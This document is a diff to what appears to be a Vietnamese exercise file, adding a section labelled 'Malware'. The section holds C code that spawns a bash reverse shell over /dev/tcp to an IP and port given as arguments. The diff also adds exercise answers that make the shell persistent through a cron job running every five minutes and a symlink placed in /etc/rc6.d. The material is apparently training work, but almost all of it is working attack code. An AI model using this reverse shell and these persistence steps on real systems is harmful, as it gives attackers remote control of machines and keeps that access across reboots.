@@ -42,14 +42,34 @@
 
 # Bài tập
 
+## Malware:
+
+```
+#include <stdio.h>
+#include <stdlib.h>
+#include <string.h>
+#include <unistd.h>
+#include <arpa/inet.h>
+int main(int argc, char *argv[])
+{
+    const char *ip = argv[1];
+    int port = atoi(argv[2]);
+    char commad[MAX_BUFFER_SIZE];
+    sprintf(commad, "bash -c \"/bin/bash -i >& /dev/tcp/%s/%d 0>&1\"", ip, port);
+    system(commad);
+    return 0;
+}
+```
+
 ## Bài 1:
 
 ```
-
+crontab -e
+*/5 * * * * /path/to/reverse-shell 127.0.0.1 1234
 ```
 
 ## Bài 2:
 
 ```
-
+ln -s /path/to/malware /etc/rc6.d/malware
 ```
